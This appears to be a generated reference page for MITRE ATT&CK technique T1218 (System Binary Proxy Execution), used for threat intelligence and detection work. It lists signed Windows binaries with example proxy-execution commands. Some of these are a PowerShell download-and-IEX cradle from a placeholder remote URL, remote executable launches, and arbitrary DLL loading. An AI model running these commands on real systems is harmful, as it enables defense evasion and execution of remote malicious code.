---
parsed_by: focuslocust
source: mitre
type: generated
---
# T1218 - System Binary Proxy Execution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1218` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.

## Related Tools

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [AccCheckConsole.exe](../../tools/windows/acccheckconsole.exe.md) | explicit | source | Command metadata lists T1218: AccCheckConsole.exe -window "Untitled - Notepad" {PATH_ABSOLUTE:.dll} |
| [AddinUtil.exe](../../tools/windows/addinutil.exe.md) | explicit | source | Command metadata lists T1218: C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:. |
| [AgentExecutor.exe](../../tools/windows/agentexecutor.exe.md) | explicit | source | Command metadata lists T1218: AgentExecutor.exe -powershell "{PATH_ABSOLUTE:.ps1}" "{PATH_ABSOLUTE:.1.log}" "{PATH_ABSOLUTE:.2.log}" "{PATH_ABSOLUTE:.3.log}" 60000 "{PATH_ABSOLUTE:folder}" 0 1 |
| [Appvlp.exe](../../tools/windows/appvlp.exe.md) | explicit | source | Command metadata lists T1218: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)" |
| [Atbroker.exe](../../tools/windows/atbroker.exe.md) | explicit | source | Command metadata lists T1218: ATBroker.exe /start malware |
| [Bash.exe](../../tools/windows/bash.exe.md) | explicit | source | Command metadata lists T1218: bash.exe |
| [Bginfo.exe](../../tools/windows/bginfo.exe.md) | explicit | source | Command metadata lists T1218: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt |
| [Bitsadmin.exe](../../tools/windows/bitsadmin.exe.md) | explicit | source | Command metadata lists T1218: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RE... |
| [CertOC.exe](../../tools/windows/certoc.exe.md) | explicit | source | Command metadata lists T1218: certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll} |
| [Change.exe](../../tools/windows/change.exe.md) | explicit | source | Command metadata lists T1218: change.exe user |
| [CustomShellHost.exe](../../tools/windows/customshellhost.exe.md) | explicit | source | Command metadata lists T1218: CustomShellHost.exe |
| [DefaultPack.EXE](../../tools/windows/defaultpack.exe.md) | explicit | source | Command metadata lists T1218: DefaultPack.EXE /C:"{CMD}" |
| [Dotnet.exe](../../tools/windows/dotnet.exe.md) | explicit | source | Command metadata lists T1218: dotnet.exe msbuild {PATH:.csproj} |
| [Extexport.exe](../../tools/windows/extexport.exe.md) | explicit | source | Command metadata lists T1218: Extexport.exe {PATH_ABSOLUTE:folder} foo bar |
| [Fsutil.exe](../../tools/windows/fsutil.exe.md) | explicit | source | Command metadata lists T1218: fsutil.exe trace decode |
| [Gpscript.exe](../../tools/windows/gpscript.exe.md) | explicit | source | Command metadata lists T1218: Gpscript /startup |
| [Ie4uinit.exe](../../tools/windows/ie4uinit.exe.md) | explicit | source | Command metadata lists T1218: ie4uinit.exe -BaseSettings |
| [Ieexec.exe](../../tools/windows/ieexec.exe.md) | explicit | source | Command metadata lists T1218: ieexec.exe {REMOTEURL:.exe} |
| [Infdefaultinstall.exe](../../tools/windows/infdefaultinstall.exe.md) | explicit | source | Command metadata lists T1218: InfDefaultInstall.exe {PATH:.inf} |
| [Msconfig.exe](../../tools/windows/msconfig.exe.md) | explicit | source | Command metadata lists T1218: Msconfig.exe -5 |
| [Msdeploy.exe](../../tools/windows/msdeploy.exe.md) | explicit | source | Command metadata lists T1218: msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}" |
| [Msdt.exe](../../tools/windows/msdt.exe.md) | explicit | source | Command metadata lists T1218: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE |
| [OfflineScannerShell.exe](../../tools/windows/offlinescannershell.exe.md) | explicit | source | Command metadata lists T1218: OfflineScannerShell |
| [Pcwrun.exe](../../tools/windows/pcwrun.exe.md) | explicit | source | Command metadata lists T1218: Pcwrun.exe {PATH_ABSOLUTE:.exe} |
| [Presentationhost.exe](../../tools/windows/presentationhost.exe.md) | explicit | source | Command metadata lists T1218: Presentationhost.exe {PATH_ABSOLUTE:.xbap} |
| [Provlaunch.exe](../../tools/windows/provlaunch.exe.md) | explicit | source | Command metadata lists T1218: provlaunch.exe LOLBin |
| [Query.exe](../../tools/windows/query.exe.md) | explicit | source | Command metadata lists T1218: query.exe user |
| [Rasautou.exe](../../tools/windows/rasautou.exe.md) | explicit | source | Command metadata lists T1218: rasautou -d {PATH:.dll} -p export_name -a a -e e |
| [Register-cimprovider.exe](../../tools/windows/register-cimprovider.exe.md) | explicit | source | Command metadata lists T1218: Register-cimprovider -path {PATH_ABSOLUTE:.dll} |
| [Reset.exe](../../tools/windows/reset.exe.md) | explicit | source | Command metadata lists T1218: reset.exe session |
| [Runexehelper.exe](../../tools/windows/runexehelper.exe.md) | explicit | source | Command metadata lists T1218: runexehelper.exe {PATH_ABSOLUTE:.exe} |
| [Runonce.exe](../../tools/windows/runonce.exe.md) | explicit | source | Command metadata lists T1218: Runonce.exe /AlternateShellStartup |
| [Runscripthelper.exe](../../tools/windows/runscripthelper.exe.md) | explicit | source | Command metadata lists T1218: runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder} |
| [SQLToolsPS.exe](../../tools/windows/sqltoolsps.exe.md) | explicit | source | Command metadata lists T1218: SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe} |
| [Scriptrunner.exe](../../tools/windows/scriptrunner.exe.md) | explicit | source | Command metadata lists T1218: ScriptRunner.exe -appvscript {PATH_SMB:.cmd} |
| [Setres.exe](../../tools/windows/setres.exe.md) | explicit | source | Command metadata lists T1218: setres.exe -w 800 -h 600 |
| [SettingSyncHost.exe](../../tools/windows/settingsynchost.exe.md) | explicit | source | Command metadata lists T1218: SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat} |
| [Sigverif.exe](../../tools/windows/sigverif.exe.md) | explicit | source | Command metadata lists T1218: sigverif.exe |
| [Sqlps.exe](../../tools/windows/sqlps.exe.md) | explicit | source | Command metadata lists T1218: Sqlps.exe -noprofile |
| [Squirrel.exe](../../tools/windows/squirrel.exe.md) | explicit | source | Command metadata lists T1218: squirrel.exe --updateRollback={REMOTEURL} |
| [Stordiag.exe](../../tools/windows/stordiag.exe.md) | explicit | source | Command metadata lists T1218: stordiag.exe |
| [SyncAppvPublishingServer.exe](../../tools/windows/syncappvpublishingserver.exe.md) | explicit | source | Command metadata lists T1218: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') \| IEX" |
| [Update.exe](../../tools/windows/update.exe.md) | explicit | source | Command metadata lists T1218: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}" |
| [VSIISExeLauncher.exe](../../tools/windows/vsiisexelauncher.exe.md) | explicit | source | Command metadata lists T1218: VSIISExeLauncher.exe -p {PATH:.exe} -a "{CMD:args}" |
| [VisualUiaVerifyNative.exe](../../tools/windows/visualuiaverifynative.exe.md) | explicit | source | Command metadata lists T1218: VisualUiaVerifyNative.exe |
| [Wab.exe](../../tools/windows/wab.exe.md) | explicit | source | Command metadata lists T1218: wab.exe |
| [Wmic.exe](../../tools/windows/wmic.exe.md) | explicit | source | Command metadata lists T1218: wmic.exe process get brief /format:"{PATH_SMB:.xsl}" |
| [WorkFolders.exe](../../tools/windows/workfolders.exe.md) | explicit | source | Command metadata lists T1218: WorkFolders |
| [Wsl.exe](../../tools/windows/wsl.exe.md) | explicit | source | Command metadata lists T1218: wsl.exe |
| [Xwizard.exe](../../tools/windows/xwizard.exe.md) | explicit | source | Command metadata lists T1218: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC} |
| [coregen.exe](../../tools/windows/coregen.exe.md) | explicit | source | Command metadata lists T1218: coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name |
| [iediagcmd.exe](../../tools/windows/iediagcmd.exe.md) | explicit | source | Command metadata lists T1218: set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab} |
| [vsls-agent.exe](../../tools/windows/vsls-agent.exe.md) | explicit | source | Command metadata lists T1218: vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll} |
| [write.exe](../../tools/windows/write.exe.md) | explicit | source | Command metadata lists T1218: write.exe |
| [wuauclt.exe](../../tools/windows/wuauclt.exe.md) | explicit | source | Command metadata lists T1218: wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer |

## Source Verification

[source record](../../sources/mitre/system-binary-proxy-execution.md)

## Evidence Excerpt

```text
created: '2018-04-18T17:59:24.739Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: 'Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with
signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that
they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project)
Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature
validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of
other files or commands.
```
